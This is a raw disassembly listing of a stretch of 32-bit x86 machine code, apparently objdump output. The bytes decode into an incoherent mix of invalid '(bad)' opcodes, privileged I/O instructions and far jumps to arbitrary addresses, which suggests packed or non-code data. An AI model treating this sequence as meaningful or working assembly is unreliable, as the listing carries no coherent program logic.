  40f9f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9f8:	mov    esp,0xeabea30a
  40f9fd:	or     al,0x99
  40f9ff:	jbe    0x40fa63
  40fa01:	mov    eax,ss
  40fa03:	xor    al,0x9e
  40fa05:	inc    edi
  40fa06:	inc    ecx
  40fa07:	or     ebx,DWORD PTR [edi+0x3b3ee4ca]
  40fa0d:	pop    eax
  40fa0e:	popf   
  40fa0f:	mov    ds:0x79f4cdcc,al
  40fa14:	mov    cs,edx
  40fa16:	into   
  40fa17:	arpl   WORD PTR [edx+0x79a6cab0],sp
  40fa1d:	adc    DWORD PTR [esi+ecx*1+0x69],ebp
  40fa21:	outs   dx,DWORD PTR ds:[esi]
  40fa22:	aam    0xd5
  40fa24:	fs pushf 
  40fa26:	mov    ah,0x69
  40fa28:	popf   
  40fa29:	sbb    BYTE PTR [ecx+0x5f],0x4b
  40fa2d:	and    cl,BYTE PTR [edi-0x40100d69]
  40fa33:	xlat   BYTE PTR ds:[ebx]
  40fa34:	ds jbe 0x40fa94
  40fa37:	(bad)  
  40fa38:	adc    al,0xed
  40fa3a:	je     0x40fa7f
  40fa3c:	add    ecx,eax
  40fa3e:	dec    DWORD PTR [ebp+eax*2-0x31f44]
  40fa45:	mov    cl,0x68
  40fa47:	add    BYTE PTR [eax],dl
  40fa49:	and    bh,bl
  40fa4b:	jl     0x40fa54
  40fa4d:	aas    
  40fa4e:	xchg   ebp,eax
  40fa4f:	jmp    DWORD PTR [esi+0x34086256]
  40fa55:	sbb    eax,0x7e897d07
  40fa5a:	dec    esi
  40fa5b:	ins    DWORD PTR es:[edi],dx
  40fa5c:	pusha  
  40fa5d:	mov    dl,0xb7
  40fa5f:	xchg   esi,eax
  40fa60:	ds sbb eax,0xca49e124
  40fa66:	cmp    ecx,DWORD PTR [ecx-0x7a0de543]
  40fa6c:	cmp    ah,BYTE PTR [ebx+edx*4-0x181350fb]
  40fa73:	pop    esi
  40fa74:	fisttp QWORD PTR [ebx-0x64]
  40fa77:	jbe    0x40fa63
  40fa79:	sub    bh,BYTE PTR [ecx-0x49]
  40fa7c:	mov    dl,0xc4
  40fa7e:	pop    eax
  40fa7f:	test   eax,0x4cb51aad
  40fa84:	sub    BYTE PTR [edi-0x50],al
  40fa87:	iret   
  40fa88:	sahf   
  40fa89:	out    0xe,eax
  40fa8b:	lea    ebx,[edi+0x2298f3b4]
  40fa91:	shr    DWORD PTR [ecx+0x35],0x63
  40fa95:	jne    0x40fa81
  40fa97:	retf   
  40fa98:	inc    esi
  40fa99:	cwde   
  40fa9a:	jne    0x40fa66
  40fa9c:	xor    dl,BYTE PTR [edx+0x2a9f5adc]
  40faa2:	mov    dl,0x58
  40faa4:	sar    bh,0x18
  40faa7:	lods   al,BYTE PTR ds:[esi]
  40faa8:	fst    DWORD PTR [ecx+0x4420474b]
  40faae:	lahf   
  40faaf:	jns    0x40fa7e
  40fab1:	out    0x78,al
  40fab3:	push   esp
  40fab5:	add    eax,0xc0ae5098
  40faba:	(bad)  
  40fabb:	pop    ss
  40fabc:	sub    DWORD PTR [ebx+0x6ea72abb],ebp
  40fac2:	fcom   DWORD PTR [ebx-0xf441da2]
  40fac8:	cmp    edx,DWORD PTR [ebx]
  40faca:	pop    esp
  40facb:	mov    dh,0x31
  40facd:	das    
  40face:	inc    ecx
  40facf:	jge    0x40fb45
  40fad1:	xchg   esi,eax
  40fad2:	push   ebp
  40fad3:	into   
  40fad4:	push   cs
  40fad5:	add    DWORD PTR [ecx],0xe
  40fad8:	dec    esp
  40fad9:	xor    DWORD PTR [esi],esi
  40fadb:	or     ch,BYTE PTR [ebx+esi*4-0x7822d3b8]
  40fae2:	fldenv [ecx]
  40fae4:	ret    
  40fae5:	stos   DWORD PTR es:[edi],eax
  40fae6:	cli    
  40fae7:	(bad)  
  40fae8:	cmp    al,0x25
  40faea:	xchg   edx,eax
  40faeb:	add    al,0x7a
  40faed:	mov    ebx,0x137524df
  40faf2:	jecxz  0x40fb2c
  40faf4:	shl    edx,1
  40faf6:	mov    bh,cl
  40faf8:	adc    al,0x34
  40fafa:	mov    ds:0x88ae8c38,eax
  40faff:	leave  
  40fb00:	and    eax,0x40206298
  40fb05:	and    BYTE PTR [ebp-0xfe1b0b],dl
  40fb0b:	and    BYTE PTR [bp+di+0x3e8b],bl
  40fb10:	outs   dx,BYTE PTR ds:[esi]
  40fb11:	lds    edi,FWORD PTR [esi-0x1e6a1f2e]
  40fb17:	ror    BYTE PTR [esi-0x34f8e31a],1
  40fb1d:	cmp    BYTE PTR [ebx],cl
  40fb1f:	mov    ecx,0x2c7ffa1a
  40fb24:	ins    BYTE PTR es:[edi],dx
  40fb25:	push   ss
  40fb26:	cmp    eax,0x29e84e47
  40fb2b:	mov    ah,0xaf
  40fb2d:	js     0x40fb96
  40fb2f:	jmp    0x40fb80
  40fb31:	imul   esp,DWORD PTR [edx+eiz*2-0xe],0xffffff94
  40fb36:	inc    ebp
  40fb37:	lds    ebp,FWORD PTR [ebx+0x218168f7]
  40fb3d:	inc    ebx
  40fb3e:	inc    eax
  40fb3f:	sbb    ecx,DWORD PTR [esi-0x13fbb3c8]
  40fb45:	jnp    0x40fb24
  40fb47:	test   eax,0x185e075b
  40fb4c:	mov    ds:0x7046cb70,al
  40fb51:	mov    bh,0xda
  40fb53:	cdq    
  40fb54:	aas    
  40fb55:	cmp    BYTE PTR [ebx+0x7047dbc2],dh
  40fb5b:	stos   DWORD PTR es:[edi],eax
  40fb5c:	int3   
  40fb5d:	adc    DWORD PTR [ebx],0x65ff71d
  40fb63:	or     al,0x2c
  40fb65:	ja     0x40fb42
  40fb67:	int    0xa4
  40fb69:	push   0xb8c51fd8
  40fb6e:	ror    bl,0xc7
  40fb71:	mov    esi,ss
  40fb73:	es icebp 
  40fb75:	mov    ah,0xc5
  40fb77:	or     BYTE PTR [esi+0x7d],0x1a
  40fb7b:	fdivrp st(7),st
  40fb7d:	(bad)  
  40fb7e:	lds    ebx,FWORD PTR [eax]
  40fb80:	cmp    al,0xd3
  40fb82:	mov    ds:0x86194d5,al
  40fb87:	sub    al,0xe4
  40fb89:	pop    ebx
  40fb8a:	jecxz  0x40fb8e
  40fb8c:	sbb    eax,0x34ed1c3a
  40fb91:	or     eax,0x222c15d0
  40fb96:	nop
  40fb97:	sub    DWORD PTR [bx+di-0x7a],eax
  40fb9b:	push   ecx
  40fb9c:	mov    al,BYTE PTR [ebx+0x486a3e00]
  40fba2:	add    BYTE PTR [edi-0x1c],dh
  40fba5:	outs   dx,BYTE PTR ds:[esi]
  40fba6:	aam    0x82
  40fba8:	inc    esp
  40fba9:	aaa    
  40fbaa:	shl    dh,1
  40fbac:	xor    bh,0xfe
  40fbaf:	sub    al,0x79
  40fbb1:	xor    DWORD PTR [ebx-0xe9e2f85],esp
  40fbb7:	pusha  
  40fbb8:	mov    dh,0xc4
  40fbba:	clc    
  40fbbb:	jo     0x40fb6d
  40fbbd:	test   BYTE PTR ds:0x52cda6d2,0xa4
  40fbc4:	das    
  40fbc5:	mov    bl,0x2
  40fbc7:	cmp    dl,BYTE PTR [edi-0x57384b5e]
  40fbcd:	les    edi,FWORD PTR ds:[edi]
  40fbd0:	phaddw mm1,QWORD PTR [eax+0x18]
  40fbd5:	dec    ebp
  40fbd6:	adc    dl,BYTE PTR [ebx]
  40fbd8:	and    DWORD PTR [edi+0x614b7dc0],0x78
  40fbdf:	jmp    0xe9a14461
  40fbe4:	and    al,0xb7
  40fbe6:	xor    cl,cl
  40fbe8:	lock lea eax,[edx-0x3c]
  40fbec:	popf   
  40fbed:	adc    eax,0x6049325c
  40fbf2:	xchg   ebx,eax
  40fbf3:	pop    ebp
  40fbf4:	add    DWORD PTR [edi+0x3d],ecx
  40fbf7:	call   FWORD PTR [esi-0x6]
  40fbfa:	(bad)
  40fbfe:	push   edi
  40fbff:	sbb    eax,0x4ed6d747
  40fc04:	f2xm1  
  40fc06:	clc    
  40fc07:	cmp    DWORD PTR [eax],edx
  40fc09:	lock mov ah,BYTE PTR [edi+0x45830d93]
  40fc10:	imul   esi,DWORD PTR [edi-0x2f272b38],0xc344e3b1
  40fc1a:	out    dx,eax
  40fc1b:	jbe    0x40fc22
  40fc1d:	fsub   DWORD PTR [ebp+0x11]
  40fc20:	mov    bl,0x64
  40fc22:	push   ecx
  40fc23:	fnstenv [edi]
  40fc25:	adc    esp,DWORD PTR [eax-0x47]
  40fc28:	ret    
  40fc29:	inc    esi
  40fc2a:	(bad)  
  40fc2b:	(bad)  
  40fc2c:	push   edi
  40fc2d:	sar    DWORD PTR [eax-0x22],cl
  40fc30:	mov    dh,0x99
  40fc32:	ss or  al,0xb8
  40fc35:	(bad)  
  40fc36:	mov    ds:0xd81c48de,eax
  40fc3b:	pop    es
  40fc3c:	mov    ah,0x49
  40fc3e:	sub    dl,cl
  40fc40:	fs mov dl,0x47
  40fc43:	mov    edi,0x62e21a32
  40fc48:	imul   edi,ebx,0x334fdb61
  40fc4e:	loopne 0x40fc58
  40fc50:	test   eax,0x60ca3065
  40fc55:	outs   dx,BYTE PTR ds:[esi]
  40fc56:	stc    
  40fc57:	mov    esi,0x6a1e1bf
  40fc5c:	mov    edi,0xb84ff57
  40fc61:	xchg   ecx,eax
  40fc62:	add    ch,BYTE PTR [eax+esi*1]
  40fc65:	jnp    0x40fc38
  40fc67:	pop    es
  40fc68:	retf   
  40fc69:	inc    esp
  40fc6a:	push   DWORD PTR [eax+ebp*2]
  40fc6d:	push   ss
  40fc6e:	add    al,dl
  40fc70:	push   ss
  40fc71:	push   ds
  40fc72:	sti    
  40fc73:	in     al,0x3b
  40fc75:	ds pop esi
  40fc77:	cmp    BYTE PTR [edx],bh
  40fc79:	sti    
  40fc7a:	jbe    0x40fc68
  40fc7c:	sbb    dl,BYTE PTR [edx+0x68]
  40fc7f:	or     BYTE PTR ds:0x8c79fb5f,0x97
  40fc86:	xchg   edi,eax
  40fc87:	icebp  
  40fc88:	loope  0x40fce2
  40fc8a:	int    0x3c
  40fc8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc8d:	enter  0xb88a,0x68
  40fc91:	loopne 0x40fc90
  40fc93:	mov    bl,0x5a
  40fc95:	mov    BYTE PTR [ebp+0x2b],0xbd
  40fc99:	lahf   
  40fc9a:	mov    ds:0x21d7ece7,eax
  40fc9f:	mov    ecx,0xaaabed4e
  40fca4:	je     0x40fcee
  40fca6:	nop
  40fca7:	aam    0x8f
  40fca9:	xchg   ebp,eax
  40fcaa:	dec    ecx
  40fcab:	mov    gs,WORD PTR [ecx]
  40fcad:	push   eax
  40fcae:	jo     0x40fcbe
  40fcb0:	and    DWORD PTR [ebx+0x66ab67e0],0x2f
  40fcb7:	fwait
  40fcb8:	jb     0x40fc4d
  40fcba:	aad    0x7
  40fcbc:	repz bound ebx,QWORD PTR [esi]
  40fcbf:	out    0xed,eax
  40fcc1:	mov    BYTE PTR [edi-0x77],dl
  40fcc4:	call   0xe775e377
  40fcc9:	dec    ecx
  40fcca:	sub    dl,bh
  40fccc:	arpl   bx,ax
  40fcce:	or     BYTE PTR [ecx+edi*2+0x38],0x32
  40fcd3:	xor    al,0xee
  40fcd5:	jg     0x40fc62
  40fcd7:	imul   edi,DWORD PTR [edx-0x39],0x3a27bd1f
  40fcde:	inc    ecx
  40fcdf:	cmp    ebx,DWORD PTR [edx-0x2e]
  40fce2:	loopne 0x40fcb8
  40fce4:	(bad)  
  40fce6:	call   0x29ee:0xec72e4c6
  40fced:	ins    BYTE PTR es:[edi],dx
  40fcee:	inc    eax
  40fcef:	jmp    0x9d9b4821
  40fcf4:	and    esp,DWORD PTR [edx]
  40fcf6:	pop    ebx
  40fcf7:	sub    bh,BYTE PTR [ecx+0x4f5adff3]
  40fcfd:	adc    bl,BYTE PTR [ebx]
  40fcff:	and    eax,DWORD PTR [edi+0x63]
  40fd02:	xchg   ebp,eax
  40fd03:	xchg   DWORD PTR [ebx+eiz*8-0x628d8a13],eax
  40fd0a:	arpl   cx,cx
  40fd0c:	inc    esp
  40fd0d:	and    ebp,DWORD PTR [eax-0x7e]
  40fd10:	rcl    DWORD PTR [ebx+ebp*1],cl
  40fd13:	mov    bh,0x5d
  40fd15:	sub    dl,BYTE PTR [ecx]
  40fd17:	pop    esi
  40fd18:	retf   
  40fd19:	xchg   edi,eax
  40fd1a:	(bad)  
  40fd1b:	pop    edx
  40fd1c:	call   0x9a67:0x2c8cbd9f
  40fd23:	test   BYTE PTR [edi-0x5d4be324],ch
  40fd29:	idiv   DWORD PTR [ecx-0xca277f4]
  40fd2f:	test   ebp,ebx
  40fd31:	and    eax,0xea8cd446
  40fd36:	(bad)  
  40fd37:	mov    esi,0x29a61823
  40fd3c:	call   0xad15:0x835320bb
  40fd43:	test   bh,al
  40fd45:	call   0x84a4:0x98a12ddc
  40fd4c:	cmp    eax,0x9b4bc70a
  40fd51:	sbb    edx,DWORD PTR [ecx-0x331ee3be]
  40fd57:	lock retf 
  40fd59:	test   ecx,ecx
  40fd5b:	jb     0x40fd34
  40fd5d:	jbe    0x40fd96
  40fd5f:	cmp    bh,BYTE PTR [eax-0x3d4a28c6]
  40fd65:	ds scas al,BYTE PTR es:[edi]
  40fd67:	(bad)  
  40fd68:	mov    ah,0x49
  40fd6a:	push   0xef52a0c7
  40fd6f:	xor    BYTE PTR [esi+0x49],0x97
  40fd73:	sub    eax,0xbbf77821
  40fd78:	rep ins DWORD PTR es:[edi],dx
  40fd7a:	mov    ecx,0x48964026
  40fd7f:	jnp    0x40fddd
  40fd81:	pop    ss
  40fd82:	pop    eax
  40fd83:	jne    0x40fdf7
  40fd85:	or     al,BYTE PTR [ecx]
  40fd87:	gs xchg esp,eax
  40fd89:	fstp   TBYTE PTR [edi+0x23dcc3d0]
  40fd8f:	(bad)  
  40fd90:	test   DWORD PTR [esi+0x59a62ff4],0xa010091f
  40fd9a:	aaa    
  40fd9b:	test   DWORD PTR [edi+0x22a21a45],ebp
  40fda1:	mov    ecx,0x3b34aa8b
  40fda6:	pop    ecx
  40fda7:	stc    
  40fda8:	mov    eax,ds:0xe6954387
  40fdad:	loope  0x40fe08
  40fdaf:	dec    esp
  40fdb0:	pop    ds
  40fdb1:	out    dx,eax
  40fdb2:	test   DWORD PTR [ebx],ebp
  40fdb4:	cli    
  40fdb5:	mov    esp,0x3235c7c
  40fdba:	shl    BYTE PTR [eax-0x120eefe7],cl
  40fdc0:	sahf   
  40fdc1:	int    0xe6
  40fdc3:	cs jmp 0x40fdf6
  40fdc6:	shl    DWORD PTR [edx],1
  40fdc8:	dec    edi
  40fdc9:	retf   
  40fdca:	mov    edi,esp
  40fdcc:	outs   dx,BYTE PTR ds:[esi]
  40fdcd:	jg     0x40fe18
  40fdcf:	xchg   ebx,eax
  40fdd0:	jno    0x40fdb6
  40fdd2:	popa   
  40fdd3:	adc    al,0x77
  40fdd5:	or     eax,0x53866c13
  40fdda:	stc    
  40fddb:	inc    edx
  40fddc:	scas   eax,DWORD PTR es:[edi]
  40fddd:	or     DWORD PTR [edi+0x2569f67],ecx
  40fde3:	enter  0x94d6,0x1a
  40fde7:	in     al,0x2a
  40fde9:	(bad)
  40fded:	add    bl,0xda
  40fdf0:	push   ebx
  40fdf1:	jne    0x40fdb2
  40fdf3:	leave  
  40fdf4:	push   0xffffffd1
  40fdf6:	mov    dh,ch
  40fdf8:	loop   0x40fe76
  40fdfa:	sbb    ebp,DWORD PTR [edi+ebp*2+0x3c9bc806]
  40fe01:	or     eax,0x29d3f42a
  40fe06:	scas   al,BYTE PTR es:[edi]
  40fe07:	int    0x18
  40fe09:	pop    ebx
  40fe0a:	cmp    BYTE PTR [eax+ebx*1+0x27],0x1
  40fe0f:	mov    dl,0x7e
  40fe11:	mov    bh,0x94
  40fe13:	mov    DWORD PTR [ebp+0x60],ebx
  40fe16:	sbb    eax,DWORD PTR [edi+0x2ad6d1c]
  40fe1c:	out    dx,al
  40fe1d:	and    DWORD PTR [esi-0x355c1def],ebp
  40fe23:	lahf   
  40fe24:	fisub  WORD PTR [ebp+ebp*8-0x39]
  40fe28:	mov    al,0xd3
  40fe2a:	sub    esp,ebp
  40fe2c:	mov    al,0xa9
  40fe2e:	inc    ebp
  40fe2f:	out    dx,al
  40fe30:	stos   DWORD PTR es:[edi],eax
  40fe31:	jl     0x40fdde
  40fe33:	xchg   edi,eax
  40fe34:	jecxz  0x40fe8c
  40fe36:	(bad)  
  40fe37:	sbb    dl,ah
  40fe39:	ficom  WORD PTR [edi]
  40fe3b:	cmp    al,0x3e
  40fe3d:	sbb    BYTE PTR [esi+0x5807d336],ch
  40fe43:	jno    0x40fe78
  40fe45:	outs   dx,BYTE PTR ds:[esi]
  40fe46:	mov    ah,BYTE PTR [edi+0x1993fc28]
  40fe4c:	ficomp WORD PTR [esp+ebp*4]
  40fe4f:	dec    BYTE PTR [ebx+0x27]
  40fe52:	adc    BYTE PTR [edx-0x425e2205],cl
  40fe58:	xor    eax,0xfba3c8d6
  40fe5d:	outs   dx,BYTE PTR ds:[esi]
  40fe5e:	add    al,0x1a
  40fe60:	int    0x6
  40fe62:	(bad)  
  40fe63:	popf   
  40fe64:	pop    edx
  40fe65:	into   
  40fe66:	jo     0x40fed6
  40fe68:	popa   
  40fe69:	cmp    eax,DWORD PTR [edi+0x657fd9c]
  40fe6f:	stos   BYTE PTR es:[edi],al
  40fe70:	popa   
  40fe71:	popa   
  40fe72:	cmc    
  40fe73:	add    al,0xda
  40fe75:	push   cs
  40fe76:	ja     0x40fe63
  40fe78:	push   eax
  40fe79:	stc    
  40fe7a:	push   ebx
  40fe7b:	shl    BYTE PTR [edx+0x5f],0xc3
  40fe7f:	xchg   edx,eax
  40fe80:	push   ecx
  40fe81:	inc    esp
  40fe82:	cwde   
  40fe83:	pop    edi
  40fe84:	sbb    ecx,0x5c
  40fe87:	adc    BYTE PTR [ebx+eax*1],0x0
  40fe8b:	xor    esi,DWORD PTR [edi+0x4a4cc335]
  40fe91:	cmp    ah,cl
  40fe93:	jmp    0x40fe69
  40fe95:	(bad)  
  40fe97:	dec    esp
  40fe98:	xchg   esi,eax
  40fe99:	test   DWORD PTR [edi-0x6b3588d9],edi
  40fe9f:	imul   ecx,eax,0xb50a856a
  40fea5:	sub    cl,dh
  40fea7:	gs cwde 
  40fea9:	adc    DWORD PTR [edi+0x221a81c9],esp
  40feaf:	jg     0x40feb2
  40feb1:	push   ebp
  40feb2:	push   0xffffffed
  40feb4:	adc    ch,al
  40feb6:	fisubr DWORD PTR [edi+eax*2-0x70418a82]
  40febd:	jns    0x40ff2d
  40febf:	retf   0x6907
  40fec2:	or     eax,0x580730da
  40fec7:	dec    eax
  40fec8:	ret    0xb39c
  40fecb:	scas   al,BYTE PTR es:[edi]
  40fecc:	cdq    
  40fecd:	xchg   ebx,eax
  40fece:	jp     0x40ff1f
  40fed0:	sbb    BYTE PTR [edi-0x68f6bfd8],dl
  40fed6:	push   0x1a
  40fed8:	mov    ecx,0xda178536
  40fedd:	pushf  
  40fede:	sti    
  40fedf:	ss pop edi
  40fee1:	sbb    ebx,eax
  40fee3:	loop   0x40ff54
  40fee5:	add    edx,DWORD PTR [ecx-0x10e67735]
  40feeb:	dec    ecx
  40feec:	xor    BYTE PTR [ecx+0x1d],dl
  40feef:	sbb    al,0x9f
  40fef1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fef2:	ret    0x4214
  40fef5:	mov    eax,0x8dc16cff
  40fefa:	add    cl,ch
  40fefc:	push   ds
  40fefd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fefe:	call   0x91d3:0x55c3d242
  40ff05:	fcomp  QWORD PTR [ebp-0x62]
  40ff08:	xlat   BYTE PTR ds:[ebx]
  40ff09:	fsubp  st(7),st
  40ff0b:	or     al,0x3b
  40ff0d:	jnp    0x40feac
  40ff0f:	lods   al,BYTE PTR ds:[esi]
  40ff10:	jb     0x40fea4
  40ff12:	push   ecx
  40ff13:	mov    ch,0x9b
  40ff15:	aaa    
  40ff16:	push   ecx
  40ff17:	retf   
  40ff18:	cs add al,0x33
  40ff1b:	pop    ss
  40ff1c:	xchg   esp,eax
  40ff1d:	div    DWORD PTR [eax]
  40ff1f:	in     al,dx
  40ff20:	retf   
  40ff21:	xor    eax,DWORD PTR ds:0x799dce8d
  40ff27:	push   ss
  40ff28:	lock call ebx
  40ff2b:	jmp    0x7dc189cd
  40ff30:	es into 
  40ff32:	push   0xffffffce
  40ff34:	ds mov ebp,0xa8be1f93
  40ff3a:	xchg   esi,eax
  40ff3b:	mov    DWORD PTR [ebx],ebx
  40ff3d:	sub    ecx,eax
  40ff3f:	nop
  40ff40:	inc    edx
  40ff41:	pop    ebx
  40ff42:	enter  0x7e1f,0x28
  40ff46:	inc    esi
  40ff47:	mov    ebp,ebp
  40ff49:	dec    ebp
  40ff4a:	jle    0x40ff4c
  40ff4c:	mov    ss,edx
  40ff4e:	cmp    al,0x1
  40ff50:	jle    0x40ffcc
  40ff52:	adc    DWORD PTR cs:[ebx-0x398ba1f7],0xb4d88edc
  40ff5d:	push   0xffffff9a
  40ff5f:	mov    ecx,DWORD PTR [edi+esi*8]
  40ff62:	sti    
  40ff63:	test   eax,0xc9f39e54
  40ff68:	xor    al,dl
  40ff6a:	stos   DWORD PTR es:[edi],eax
  40ff6b:	cmp    BYTE PTR [edx],dh
  40ff6d:	jecxz  0x40ff80
  40ff6f:	fstp   DWORD PTR [ecx+0x4f]
  40ff72:	push   edx
  40ff73:	(bad)
  40ff76:	out    dx,al
  40ff77:	(bad)  
  40ff78:	push   DWORD PTR [eax+esi*4-0x30]
  40ff7c:	adc    esi,0xffffffd0
  40ff7f:	lods   eax,DWORD PTR ds:[esi]
  40ff80:	jo     0x40ffc4
  40ff82:	xchg   ebp,eax
  40ff83:	xchg   edi,eax
  40ff84:	cld    
  40ff85:	leave  
  40ff86:	pop    ds
  40ff87:	mov    bh,0x35
  40ff89:	dec    edx
  40ff8a:	ss dec ebx
  40ff8c:	cmp    esp,ebp
  40ff8e:	ficomp WORD PTR [eax]
  40ff90:	outs   dx,DWORD PTR cs:[esi]
  40ff92:	jbe    0x40ffc1
  40ff94:	jl     0x40ffaf
  40ff96:	cmp    BYTE PTR [edx+0x20ba953e],0x6c
  40ff9d:	xor    bh,BYTE PTR [esi]
  40ff9f:	enter  0xcaa0,0x53
  40ffa3:	jae    0x40ffc4
  40ffa5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffa6:	lods   al,BYTE PTR ds:[esi]
  40ffa7:	leave  
  40ffa8:	out    dx,eax
  40ffa9:	sbb    ah,BYTE PTR [edi+edx*1-0x4b]
  40ffad:	pop    esp
  40ffae:	imul   esi,esi,0xd6e3bfd2
  40ffb4:	out    0xaa,al
  40ffb6:	aas    
  40ffb7:	dec    ecx
  40ffb8:	sti    
  40ffb9:	sbb    BYTE PTR [esi+0xada9c6a],dl
  40ffbf:	jmp    0x40ffcf
  40ffc1:	sub    BYTE PTR [eax+edi*8+0x2ab227ea],0xfd
  40ffc9:	pop    ebp
  40ffca:	xor    ebx,DWORD PTR [esi+eiz*8]
  40ffcd:	aad    0x79
  40ffcf:	loopne 0x410002
  40ffd1:	add    BYTE PTR [eax+eiz*1],bl
  40ffd4:	push   ecx
  40ffd5:	or     al,0x40
  40ffd7:	scas   al,BYTE PTR es:[edi]
  40ffd8:	push   ecx
  40ffd9:	inc    esp
  40ffda:	sub    bh,BYTE PTR [esi]
  40ffdc:	(bad)  
  40ffdd:	es leave 
  40ffdf:	cdq    
  40ffe0:	jmp    0x631e:0x1abbddd0
  40ffe7:	fld    DWORD PTR [ebx-0x50]
  40ffea:	icebp  
  40ffeb:	imul   edi,DWORD PTR [eax-0x2f90510a],0x5
  40fff2:	dec    eax
  40fff3:	push   esp
  40fff4:	mov    fs,WORD PTR [eax]
  40fff6:	inc    edi
  40fff7:	xchg   BYTE PTR [edx],cl
  40fff9:	dec    edi
  40fffa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fffb:	or     eax,0xf74cdfd9
  410000:	(bad)  
  410001:	fwait
  410002:	xor    al,0xdd
  410004:	add    ebp,DWORD PTR [edx-0x41]
  410007:	mov    bh,0x61
  410009:	pop    ds
  41000a:	inc    edi
  41000b:	in     eax,dx
  41000c:	adc    dh,BYTE PTR [esi+ebx*2-0x29]
  410010:	hlt    
  410011:	push   edx
  410012:	xchg   ecx,eax
  410013:	dec    edi
  410014:	push   ss
  410015:	adc    esi,edx
  410017:	cwde   
  410018:	in     eax,dx
  410019:	mov    ds:0x9dc0b302,eax
  41001e:	push   ebx
  41001f:	ja     0x40ffbc
  410021:	fs dec ebx
  410023:	cmp    al,0x56
  410025:	mov    gs,WORD PTR ds:0xd47c7a94
  41002b:	mov    edi,0xcc54aea5
  410030:	daa    
  410031:	mov    ah,0x97
  410033:	inc    esi
  410034:	dec    eax
  410035:	xchg   BYTE PTR [edx],ch
  410037:	or     esp,DWORD PTR [edx]
  410039:	stos   DWORD PTR es:[edi],eax
  41003a:	mov    cl,0x9c
  41003c:	rcl    DWORD PTR [edx+0x16],0xe9
  410040:	in     eax,0xe8
  410042:	mov    esi,0xb48b41fc
  410047:	or     al,0x9e
  410049:	shl    DWORD PTR [edx+0x15095e7e],cl
  41004f:	mov    edi,0xb3a3cf93
  410054:	inc    edx
  410055:	pop    edi
  410056:	push   es
  410057:	in     eax,0xbf
  410059:	inc    edx
  41005a:	repz dec ebp
  41005c:	adc    eax,0x6af3054c
  410061:	cld    
  410062:	das    
  410063:	arpl   WORD PTR [eax],dx
  410065:	adc    cl,0x9
  410068:	pop    ebx
  410069:	pause  
  41006b:	test   al,0x69
  41006d:	into   
  41006e:	sub    al,0xb3
  410070:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410071:	in     al,0x15
  410073:	jle    0x41007a
  410075:	dec    eax
  410076:	leave  
  410077:	outs   dx,BYTE PTR ds:[esi]
  410078:	out    dx,eax
  410079:	(bad)  
  41007a:	in     al,0xba
  41007c:	fdivrp st(5),st
  41007e:	gs imul edi,eax,0x12
  410082:	into   
  410083:	outs   dx,DWORD PTR ds:[esi]
  410084:	into   
  410085:	mov    edi,edx
  410087:	cmp    eax,0x172e770
  41008c:	loopne 0x410090
  41008e:	int3   
  41008f:	nop
  410090:	retf   
  410091:	jae    0x41009d
  410093:	push   0xbe6034a7
  410098:	stos   BYTE PTR es:[edi],al
  410099:	cmp    eax,0x81eba5ba
  41009e:	aas    
  41009f:	iret   
  4100a0:	sub    edx,eax
  4100a2:	cli    
  4100a3:	ret    0x905c
  4100a6:	jmp    0x3a137630
  4100ab:	pop    edi
  4100ac:	adc    eax,DWORD PTR [ebx]
  4100ae:	out    dx,eax
  4100af:	stos   BYTE PTR es:[edi],al
  4100b0:	mov    edi,0x1306c29e
  4100b5:	fist   DWORD PTR [ebx+0x7c]
  4100b8:	add    eax,0xeb4c7887
  4100bd:	aas    
  4100be:	fld    QWORD PTR [edx-0x466ed6fa]
  4100c4:	pushf  
  4100c5:	dec    ebx
  4100c6:	in     al,0xd9
  4100c8:	push   esp
  4100c9:	add    BYTE PTR [ebx-0x4fb23ecd],0x4b
  4100d0:	call   0xe177773
  4100d5:	dec    eax
  4100d6:	cmp    BYTE PTR ds:0xf378ae9a,0x2e
  4100dd:	rcr    DWORD PTR [ebp+eax*8-0x40],cl
  4100e1:	add    al,0x40
  4100e3:	fisubr DWORD PTR [eax-0x60]
  4100e6:	push   0xffffffd0
  4100e8:	pusha  
  4100e9:	imul   esi,DWORD PTR [edx-0x74053cbc],0x82982843
  4100f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100f4:	lahf   
  4100f5:	in     eax,dx
  4100f6:	imul   DWORD PTR [ecx+0x76777911]
  4100fc:	int3   
  4100fd:	or     BYTE PTR [edi+esi*8+0x2b2a6dd9],ah
  410104:	and    al,0x5
  410106:	jno    0x410161
  410108:	(bad)  
  410109:	mov    ch,0x1e
  41010b:	popa   
  41010c:	add    al,0xf4
  41010e:	aaa    
  41010f:	leave  
  410110:	les    esi,FWORD PTR [edx]
  410112:	adc    ebx,DWORD PTR ss:[ebp+0x72153474]
  410119:	and    bh,ah
  41011b:	mov    edx,0x7139659f
  410120:	bnd ret 0x3b3b
  410124:	sahf   
  410125:	xchg   BYTE PTR [esi],ah
  410127:	mov    edi,0xde9ae251
  41012c:	enter  0xc052,0xcf
  410130:	dec    edx
  410131:	xchg   edx,eax
  410132:	mov    eax,ds:0x6a403cd1
  410137:	repnz pop ecx
  410139:	jl     0x41014c
  41013b:	sub    cl,BYTE PTR [ecx+0x22]
  41013e:	mov    eax,ds:0x699da01b
  410143:	ja     0x41012a
  410145:	shl    BYTE PTR ds:0x1d13fd2c,0x22
  41014c:	mov    BYTE PTR [edx-0x2b],0xc3
  410150:	add    sp,si
  410153:	adc    esp,ecx
  410155:	or     eax,0x9cc86fca
  41015a:	pop    edx
  41015b:	add    eax,0xfa74040e
  410160:	retf   
  410161:	test   DWORD PTR ds:0x70e25a5e,esi
  410167:	sub    BYTE PTR [edx],0x97
  41016a:	lods   al,BYTE PTR ds:[esi]
  41016b:	jmp    0x3ddb115c
  410170:	int3   
  410171:	mov    al,ds:0xe73b5a96
  410176:	(bad)  
  410177:	fdiv   st(7),st
  410179:	outs   dx,BYTE PTR ds:[esi]
  41017a:	sbb    ecx,ebx
  41017c:	mov    es,WORD PTR [edx]
  41017e:	mov    dh,0x7c
  410180:	repnz or dl,BYTE PTR [ecx-0x3a]
  410184:	xchg   esi,eax
  410185:	fadd   DWORD PTR [edx+ebx*4-0x9]
